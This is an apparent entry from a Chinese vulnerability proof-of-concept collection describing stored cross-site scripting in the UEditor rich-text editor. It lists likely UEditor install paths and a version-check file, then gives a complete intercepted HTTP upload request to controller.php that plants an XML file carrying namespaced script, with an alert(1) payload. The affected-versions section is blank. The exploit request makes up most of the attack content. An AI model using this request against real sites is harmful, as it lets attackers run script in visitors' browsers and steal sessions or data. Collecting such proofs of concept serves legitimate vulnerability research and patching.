---
version: "/ueditor/ueditor.all.js"
source: "wy876 漏洞文库"
---

# ueditor存在XSS漏洞

### 一、漏洞描述
ueditor存在XSS漏洞

### 二、影响版本


### 三、漏洞复现
Ueditor路径：

```plain
/ueditor/
/ueditor-1.4.3.3/net/
/ueditor1_4_3_3-utf8-net/utf8-net/
/utf8-net/
```

查看版本：

```plain
/ueditor/ueditor.all.js
```

首先点击上传附件，通过burp拦截，修改上传内容


```plain
POST /ueditor/php/controller.php?action=uploadfile&encode=utf-8 HTTP/1.1
Host: 
Content-Length: 886
X_Requested_With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNHZorABX70DBbzax
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="id"

WU_FILE_0
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="name"

phphello.jpg
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="type"

image/jpeg
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="lastModifiedDate"

Tue May 28 2024 11:33:15 GMT+0800 (香港标准时间)
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="size"

34
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="upfile"; filename="phphello.xml"
Content-Type: image/jpeg

<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>
</body>
</html>
------WebKitFormBoundaryNHZorABX70DBbzax--
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fn98g15xv4wqohvy>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
